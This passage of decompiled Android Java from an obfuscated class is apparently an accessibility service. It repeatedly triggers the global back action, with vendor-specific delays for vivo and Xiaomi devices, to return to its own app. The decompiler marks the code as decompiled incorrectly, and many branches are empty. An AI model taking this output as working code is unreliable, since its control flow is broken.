                                    dqtvuisjdVar2 = dqtvuisjdVar;
                                }
                                if (dqtvuisjdVar2.m211483h7()) {
                                    t60.m214714d6("dqtvuisjd", "✅ [导航] 应用页面状态稳定，无需返回");
                                    return t60.m214689a7(true);
                                }
                                t60.m214726f4("dqtvuisjd", "⚠️ [导航] 应用页面状态不稳定，继续返回操作");
                                t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第一次返回操作");
                                dqtvuisjdVar2.performGlobalAction(1);
                                if (AbstractC0779a1.m213656a9(str6, "vivo") || i != 31) {
                                    dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar2;
                                    dqtvuisjd_smartreturntoapp_1.f52685a1 = str6;
                                    dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                    dqtvuisjd_smartreturntoapp_1.f52690a6 = 8;
                                    if (b81.m210571b1(1000L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                        str7 = str6;
                                        dqtvuisjdVar3 = dqtvuisjdVar2;
                                        zM211483h72 = dqtvuisjdVar3.m211483h7();
                                        t60.m214714d6("dqtvuisjd", str4 + zM211483h72);
                                        if (zM211483h72) {
                                            t60.m214714d6("dqtvuisjd", "✅ [导航] 第一次返回成功，验证稳定性");
                                            dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar3;
                                            dqtvuisjd_smartreturntoapp_1.f52685a1 = str7;
                                            dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                            dqtvuisjd_smartreturntoapp_1.f52690a6 = 9;
                                            if (b81.m210571b1(500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                            }
                                            if (!dqtvuisjdVar3.m211483h7()) {
                                                t60.m214714d6("dqtvuisjd", "✅ [导航] 第一次返回成功且状态稳定");
                                                return t60.m214689a7(true);
                                            }
                                            t60.m214726f4("dqtvuisjd", "⚠️ [导航] 第一次返回成功但状态不稳定，继续返回");
                                            t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第二次返回操作");
                                            dqtvuisjdVar3.performGlobalAction(1);
                                            if (AbstractC0779a1.m213656a9(str7, "vivo") || i != 31) {
                                                dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar3;
                                                dqtvuisjd_smartreturntoapp_1.f52685a1 = str7;
                                                dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                dqtvuisjd_smartreturntoapp_1.f52690a6 = 11;
                                                if (b81.m210571b1(1000L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                    str8 = str7;
                                                    dqtvuisjdVar4 = dqtvuisjdVar3;
                                                    zM211483h73 = dqtvuisjdVar4.m211483h7();
                                                    t60.m214714d6("dqtvuisjd", str3 + zM211483h73);
                                                    if (zM211483h73) {
                                                        t60.m214714d6("dqtvuisjd", "✅ [导航] 第二次返回成功，验证稳定性");
                                                        if (AbstractC0779a1.m213656a9(str8, "vivo") && i == 31) {
                                                            dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar4;
                                                            dqtvuisjd_smartreturntoapp_1.f52685a1 = str8;
                                                            dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                            dqtvuisjd_smartreturntoapp_1.f52690a6 = 12;
                                                            if (b81.m210571b1(1000L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                            }
                                                            if (!dqtvuisjdVar4.m211483h7()) {
                                                            }
                                                        } else {
                                                            dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar4;
                                                            dqtvuisjd_smartreturntoapp_1.f52685a1 = str8;
                                                            dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                            dqtvuisjd_smartreturntoapp_1.f52690a6 = 13;
                                                            if (b81.m210571b1(500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                            }
                                                            if (!dqtvuisjdVar4.m211483h7()) {
                                                                t60.m214714d6("dqtvuisjd", "✅ [导航] 第二次返回成功且状态稳定");
                                                                return t60.m214689a7(true);
                                                            }
                                                            t60.m214726f4("dqtvuisjd", "⚠️ [导航] 第二次返回成功但状态不稳定，继续返回");
                                                        }
                                                        t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第三次返回操作");
                                                        dqtvuisjdVar4.performGlobalAction(1);
                                                        if (AbstractC0779a1.m213656a9(str8, "vivo") || i != 31) {
                                                            dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar4;
                                                            dqtvuisjd_smartreturntoapp_1.f52685a1 = str8;
                                                            dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                            dqtvuisjd_smartreturntoapp_1.f52690a6 = 15;
                                                            if (b81.m210571b1(1000L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                                str9 = str8;
                                                                dqtvuisjdVar5 = dqtvuisjdVar4;
                                                                zM211483h74 = dqtvuisjdVar5.m211483h7();
                                                                t60.m214714d6("dqtvuisjd", str2 + zM211483h74);
                                                                if (zM211483h74) {
                                                                    t60.m214714d6("dqtvuisjd", "✅ [导航] 第三次返回成功，验证稳定性");
                                                                    if (AbstractC0779a1.m213656a9(str9, "vivo") && i == 31) {
                                                                        dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar5;
                                                                        dqtvuisjd_smartreturntoapp_1.f52685a1 = str9;
                                                                        dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                                        dqtvuisjd_smartreturntoapp_1.f52690a6 = 16;
                                                                        if (b81.m210571b1(1000L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                                        }
                                                                        if (!dqtvuisjdVar5.m211483h7()) {
                                                                        }
                                                                    } else {
                                                                        dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar5;
                                                                        dqtvuisjd_smartreturntoapp_1.f52685a1 = str9;
                                                                        dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                                        dqtvuisjd_smartreturntoapp_1.f52690a6 = 17;
                                                                        if (b81.m210571b1(500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                                        }
                                                                        if (!dqtvuisjdVar5.m211483h7()) {
                                                                            t60.m214714d6("dqtvuisjd", "✅ [导航] 第三次返回成功且状态稳定");
                                                                            return t60.m214689a7(true);
                                                                        }
                                                                        t60.m214726f4("dqtvuisjd", "⚠️ [导航] 第三次返回成功但状态不稳定，继续返回");
                                                                    }
                                                                    t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第四次返回操作");
                                                                    dqtvuisjdVar5.performGlobalAction(1);
                                                                    if (AbstractC0779a1.m213656a9(str9, "vivo") || i != 31) {
                                                                        dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar5;
                                                                        dqtvuisjd_smartreturntoapp_1.f52685a1 = str9;
                                                                        dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                                        dqtvuisjd_smartreturntoapp_1.f52690a6 = 19;
                                                                        if (b81.m210571b1(500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                                            str10 = str9;
                                                                            dqtvuisjdVar6 = dqtvuisjdVar5;
                                                                            zM211483h75 = dqtvuisjdVar6.m211483h7();
                                                                            t60.m214714d6("dqtvuisjd", str + zM211483h75);
                                                                            if (zM211483h75) {
                                                                                t60.m214714d6("dqtvuisjd", "✅ [导航] 第四次返回成功，已回到应用页面");
                                                                                return t60.m214689a7(true);
                                                                            }
                                                                            t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第五次返回操作");
                                                                            dqtvuisjdVar6.performGlobalAction(1);
                                                                            if (AbstractC0779a1.m213656a9(str10, "vivo") && i == 31) {
                                                                                dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar6;
                                                                                dqtvuisjd_smartreturntoapp_1.f52685a1 = str10;
                                                                                dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                                                dqtvuisjd_smartreturntoapp_1.f52690a6 = 20;
                                                                                if (b81.m210571b1(1500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                                                }
                                                                            } else {
                                                                                dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar6;
                                                                                dqtvuisjd_smartreturntoapp_1.f52685a1 = str10;
                                                                                dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                                                dqtvuisjd_smartreturntoapp_1.f52690a6 = 21;
                                                                                if (b81.m210571b1(500L, dqtvuisjd_smartreturntoapp_1) != coroutineSingletons) {
                                                                                    String str12 = str10;
                                                                                    int i4 = i;
                                                                                    dqtvuisjdVar7 = dqtvuisjdVar6;
                                                                                    zM211483h76 = dqtvuisjdVar7.m211483h7();
                                                                                    t60.m214714d6("dqtvuisjd", "✅ [导航] 第六次检测：第五次返回后是否在应用 = " + zM211483h76);
                                                                                    if (zM211483h76) {
                                                                                        t60.m214714d6("dqtvuisjd", "✅ [导航] 第五次返回成功，已回到应用页面");
                                                                                        return t60.m214689a7(true);
                                                                                    }
                                                                                    t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第六次返回操作");
                                                                                    dqtvuisjdVar7.performGlobalAction(1);
                                                                                    if (!AbstractC0779a1.m213656a9(str12, "vivo") || i4 != 31) {
                                                                                        dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar7;
                                                                                        dqtvuisjd_smartreturntoapp_1.f52685a1 = null;
                                                                                        dqtvuisjd_smartreturntoapp_1.f52690a6 = 23;
                                                                                        break;
                                                                                    } else {
                                                                                        dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar7;
                                                                                        dqtvuisjd_smartreturntoapp_1.f52685a1 = null;
                                                                                        dqtvuisjd_smartreturntoapp_1.f52690a6 = 22;
                                                                                        if (b81.m210571b1(1500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                                                        }
                                                                                        zM211483h77 = dqtvuisjdVar7.m211483h7();
                                                                                        t60.m214714d6("dqtvuisjd", "✅ [导航] 第七次检测：第六次返回后是否在应用 = " + zM211483h77);
                                                                                        if (zM211483h77) {
                                                                                            t60.m214726f4("dqtvuisjd", "⚠️ [导航] 六次返回操作都未成功回到应用");
                                                                                            return t60.m214689a7(false);
                                                                                        }
                                                                                        t60.m214714d6("dqtvuisjd", "✅ [导航] 第六次返回成功，已回到应用页面");
                                                                                        return t60.m214689a7(true);
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    } else {
                                                                        dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar5;
                                                                        dqtvuisjd_smartreturntoapp_1.f52685a1 = str9;
                                                                        dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                                        dqtvuisjd_smartreturntoapp_1.f52690a6 = 18;
                                                                        if (b81.m210571b1(1500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                                        }
                                                                    }
                                                                } else {
                                                                    t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第四次返回操作");
                                                                    dqtvuisjdVar5.performGlobalAction(1);
                                                                    if (AbstractC0779a1.m213656a9(str9, "vivo")) {
                                                                    }
                                                                    dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar5;
                                                                    dqtvuisjd_smartreturntoapp_1.f52685a1 = str9;
                                                                    dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                                    dqtvuisjd_smartreturntoapp_1.f52690a6 = 19;
                                                                    if (b81.m210571b1(500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                                    }
                                                                }
                                                            }
                                                        } else {
                                                            dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar4;
                                                            dqtvuisjd_smartreturntoapp_1.f52685a1 = str8;
                                                            dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                            dqtvuisjd_smartreturntoapp_1.f52690a6 = 14;
                                                            if (b81.m210571b1(1500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                            }
                                                        }
                                                    } else {
                                                        t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第三次返回操作");
                                                        dqtvuisjdVar4.performGlobalAction(1);
                                                        if (AbstractC0779a1.m213656a9(str8, "vivo")) {
                                                        }
                                                        dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar4;
                                                        dqtvuisjd_smartreturntoapp_1.f52685a1 = str8;
                                                        dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                        dqtvuisjd_smartreturntoapp_1.f52690a6 = 15;
                                                        if (b81.m210571b1(1000L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                        }
                                                    }
                                                }
                                            } else {
                                                dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar3;
                                                dqtvuisjd_smartreturntoapp_1.f52685a1 = str7;
                                                dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                                dqtvuisjd_smartreturntoapp_1.f52690a6 = 10;
                                                if (b81.m210571b1(1500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                                }
                                            }
                                        } else {
                                            t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第二次返回操作");
                                            dqtvuisjdVar3.performGlobalAction(1);
                                            if (AbstractC0779a1.m213656a9(str7, "vivo")) {
                                            }
                                            dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar3;
                                            dqtvuisjd_smartreturntoapp_1.f52685a1 = str7;
                                            dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                            dqtvuisjd_smartreturntoapp_1.f52690a6 = 11;
                                            if (b81.m210571b1(1000L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                            }
                                        }
                                    }
                                } else {
                                    dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar2;
                                    dqtvuisjd_smartreturntoapp_1.f52685a1 = str6;
                                    dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                    dqtvuisjd_smartreturntoapp_1.f52690a6 = 7;
                                    if (b81.m210571b1(1500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                    }
                                }
                            } else {
                                str6 = lowerCase;
                                dqtvuisjdVar2 = dqtvuisjdVar;
                                t60.m214714d6("dqtvuisjd", "✅ [导航] 执行第一次返回操作");
                                dqtvuisjdVar2.performGlobalAction(1);
                                if (AbstractC0779a1.m213656a9(str6, "vivo")) {
                                }
                                dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar2;
                                dqtvuisjd_smartreturntoapp_1.f52685a1 = str6;
                                dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                dqtvuisjd_smartreturntoapp_1.f52690a6 = 8;
                                if (b81.m210571b1(1000L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                }
                            }
                        }
                    } else {
                        dqtvuisjdVar = this;
                        i = i3;
                        zM211483h7 = dqtvuisjdVar.m211483h7();
                        t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] 启动Activity后检测: 在app=" + zM211483h7 + ", 耗时=" + (System.currentTimeMillis() - jCurrentTimeMillis) + "ms");
                        if (zM211483h7) {
                        }
                    }
                    return coroutineSingletons;
                case 1:
                    kg1.m213544f4(obj);
                    objM211525m22 = obj;
                    zBooleanValue = ((Boolean) objM211525m22).booleanValue();
                    return t60.m214689a7(zBooleanValue);
                case 2:
                    kg1.m213544f4(obj);
                    objM211526m3 = obj;
                    zBooleanValue = ((Boolean) objM211526m3).booleanValue();
                    return t60.m214689a7(zBooleanValue);
                case 3:
                    kg1.m213544f4(obj);
                    objM211525m2 = obj;
                    zBooleanValue = ((Boolean) objM211525m2).booleanValue();
                    return t60.m214689a7(zBooleanValue);
                case 4:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    j = dqtvuisjd_smartreturntoapp_1.f52686a2;
                    str5 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    str3 = "✅ [导航] 第三次检测：第二次返回后是否在应用 = ";
                    str4 = "✅ [导航] 第二次检测：第一次返回后是否在应用 = ";
                    t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] 等待完成");
                    jCurrentTimeMillis = j;
                    lowerCase = str5;
                    zM211483h7 = dqtvuisjdVar.m211483h7();
                    t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] 启动Activity后检测: 在app=" + zM211483h7 + ", 耗时=" + (System.currentTimeMillis() - jCurrentTimeMillis) + "ms");
                    if (zM211483h7) {
                    }
                    break;
                case 5:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str6 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar2 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    str3 = "✅ [导航] 第三次检测：第二次返回后是否在应用 = ";
                    str4 = "✅ [导航] 第二次检测：第一次返回后是否在应用 = ";
                    if (dqtvuisjdVar2.m211483h7()) {
                    }
                    break;
                case 6:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str6 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar2 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    str3 = "✅ [导航] 第三次检测：第二次返回后是否在应用 = ";
                    str4 = "✅ [导航] 第二次检测：第一次返回后是否在应用 = ";
                    if (dqtvuisjdVar2.m211483h7()) {
                    }
                    break;
                case 7:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str6 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar2 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    str3 = "✅ [导航] 第三次检测：第二次返回后是否在应用 = ";
                    str4 = "✅ [导航] 第二次检测：第一次返回后是否在应用 = ";
                    str7 = str6;
                    dqtvuisjdVar3 = dqtvuisjdVar2;
                    zM211483h72 = dqtvuisjdVar3.m211483h7();
                    t60.m214714d6("dqtvuisjd", str4 + zM211483h72);
                    if (zM211483h72) {
                    }
                    return coroutineSingletons;
                case 8:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str6 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar2 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    str3 = "✅ [导航] 第三次检测：第二次返回后是否在应用 = ";
                    str4 = "✅ [导航] 第二次检测：第一次返回后是否在应用 = ";
                    str7 = str6;
                    dqtvuisjdVar3 = dqtvuisjdVar2;
                    zM211483h72 = dqtvuisjdVar3.m211483h7();
                    t60.m214714d6("dqtvuisjd", str4 + zM211483h72);
                    if (zM211483h72) {
                    }
                    return coroutineSingletons;
                case 9:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str7 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar3 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    str3 = "✅ [导航] 第三次检测：第二次返回后是否在应用 = ";
                    if (!dqtvuisjdVar3.m211483h7()) {
                    }
                    break;
                case 10:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str7 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar3 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    str3 = "✅ [导航] 第三次检测：第二次返回后是否在应用 = ";
                    str8 = str7;
                    dqtvuisjdVar4 = dqtvuisjdVar3;
                    zM211483h73 = dqtvuisjdVar4.m211483h7();
                    t60.m214714d6("dqtvuisjd", str3 + zM211483h73);
                    if (zM211483h73) {
                    }
                    return coroutineSingletons;
                case oe0.DEFAULT_M /* 11 */:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str7 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar3 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    str3 = "✅ [导航] 第三次检测：第二次返回后是否在应用 = ";
                    str8 = str7;
                    dqtvuisjdVar4 = dqtvuisjdVar3;
                    zM211483h73 = dqtvuisjdVar4.m211483h7();
                    t60.m214714d6("dqtvuisjd", str3 + zM211483h73);
                    if (zM211483h73) {
                    }
                    return coroutineSingletons;
                case FileClientSessionCache.MAX_SIZE /* 12 */:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str8 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar4 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    if (!dqtvuisjdVar4.m211483h7()) {
                    }
                    break;
                case 13:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str8 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar4 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    if (!dqtvuisjdVar4.m211483h7()) {
                    }
                    break;
                case 14:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str8 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar4 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    str9 = str8;
                    dqtvuisjdVar5 = dqtvuisjdVar4;
                    zM211483h74 = dqtvuisjdVar5.m211483h7();
                    t60.m214714d6("dqtvuisjd", str2 + zM211483h74);
                    if (zM211483h74) {
                    }
                    return coroutineSingletons;
                case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str8 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar4 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    str9 = str8;
                    dqtvuisjdVar5 = dqtvuisjdVar4;
                    zM211483h74 = dqtvuisjdVar5.m211483h7();
                    t60.m214714d6("dqtvuisjd", str2 + zM211483h74);
                    if (zM211483h74) {
                    }
                    return coroutineSingletons;
                case 16:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str9 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar5 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    if (!dqtvuisjdVar5.m211483h7()) {
                    }
                    break;
                case 17:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str9 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar5 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    if (!dqtvuisjdVar5.m211483h7()) {
                    }
                    break;
                case 18:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str9 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar5 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str10 = str9;
                    dqtvuisjdVar6 = dqtvuisjdVar5;
                    zM211483h75 = dqtvuisjdVar6.m211483h7();
                    t60.m214714d6("dqtvuisjd", str + zM211483h75);
                    if (zM211483h75) {
                    }
                    break;
                case Base64.Encoder.LINE_GROUPS /* 19 */:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str9 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar5 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str10 = str9;
                    dqtvuisjdVar6 = dqtvuisjdVar5;
                    zM211483h75 = dqtvuisjdVar6.m211483h7();
                    t60.m214714d6("dqtvuisjd", str + zM211483h75);
                    if (zM211483h75) {
                    }
                    break;
                case 20:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str10 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar6 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    String str122 = str10;
                    int i42 = i;
                    dqtvuisjdVar7 = dqtvuisjdVar6;
                    zM211483h76 = dqtvuisjdVar7.m211483h7();
                    t60.m214714d6("dqtvuisjd", "✅ [导航] 第六次检测：第五次返回后是否在应用 = " + zM211483h76);
                    if (zM211483h76) {
                    }
                    break;
                case 21:
                    i = dqtvuisjd_smartreturntoapp_1.f52687a3;
                    str10 = dqtvuisjd_smartreturntoapp_1.f52685a1;
                    dqtvuisjdVar6 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    String str1222 = str10;
                    int i422 = i;
                    dqtvuisjdVar7 = dqtvuisjdVar6;
                    zM211483h76 = dqtvuisjdVar7.m211483h7();
                    t60.m214714d6("dqtvuisjd", "✅ [导航] 第六次检测：第五次返回后是否在应用 = " + zM211483h76);
                    if (zM211483h76) {
                    }
                    break;
                case 22:
                case 23:
                    dqtvuisjdVar7 = dqtvuisjd_smartreturntoapp_1.f52684a0;
                    kg1.m213544f4(obj);
                    zM211483h77 = dqtvuisjdVar7.m211483h7();
                    t60.m214714d6("dqtvuisjd", "✅ [导航] 第七次检测：第六次返回后是否在应用 = " + zM211483h77);
                    if (zM211483h77) {
                    }
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        } catch (Exception e2) {
            t60.m214705c6("dqtvuisjd", "❌ [导航] 智能返回应用失败", e2);
            return t60.m214689a7(false);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:45:0x00d4 A[Catch: Exception -> 0x003c, TryCatch #0 {Exception -> 0x003c, blocks: (B:14:0x0037, B:51:0x0106, B:21:0x0049, B:43:0x00bf, B:45:0x00d4, B:47:0x00dc, B:24:0x0050, B:35:0x008e, B:37:0x00a3, B:39:0x00ab, B:27:0x0057, B:29:0x0071, B:31:0x0079), top: B:56:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:47:0x00dc A[Catch: Exception -> 0x003c, TryCatch #0 {Exception -> 0x003c, blocks: (B:14:0x0037, B:51:0x0106, B:21:0x0049, B:43:0x00bf, B:45:0x00d4, B:47:0x00dc, B:24:0x0050, B:35:0x008e, B:37:0x00a3, B:39:0x00ab, B:27:0x0057, B:29:0x0071, B:31:0x0079), top: B:56:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* renamed from: m2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211525m2(ContinuationImpl continuationImpl) throws Throwable {
        dqtvuisjd$smartReturnToAppForMiAndroid10$1 dqtvuisjd_smartreturntoappformiandroid10_1;
        dqtvuisjd dqtvuisjdVar;
        dqtvuisjd dqtvuisjdVar2;
        boolean zM211483h7;
        dqtvuisjd dqtvuisjdVar3;
        if (continuationImpl instanceof dqtvuisjd$smartReturnToAppForMiAndroid10$1) {
            dqtvuisjd_smartreturntoappformiandroid10_1 = (dqtvuisjd$smartReturnToAppForMiAndroid10$1) continuationImpl;
            int i = dqtvuisjd_smartreturntoappformiandroid10_1.f52694a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                dqtvuisjd_smartreturntoappformiandroid10_1.f52694a3 = i - Integer.MIN_VALUE;
            } else {
                dqtvuisjd_smartreturntoappformiandroid10_1 = new dqtvuisjd$smartReturnToAppForMiAndroid10$1(this, continuationImpl);
            }
        }
        Object obj = dqtvuisjd_smartreturntoappformiandroid10_1.f52692a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = dqtvuisjd_smartreturntoappformiandroid10_1.f52694a3;
        try {
            if (i2 == 0) {
                kg1.m213544f4(obj);
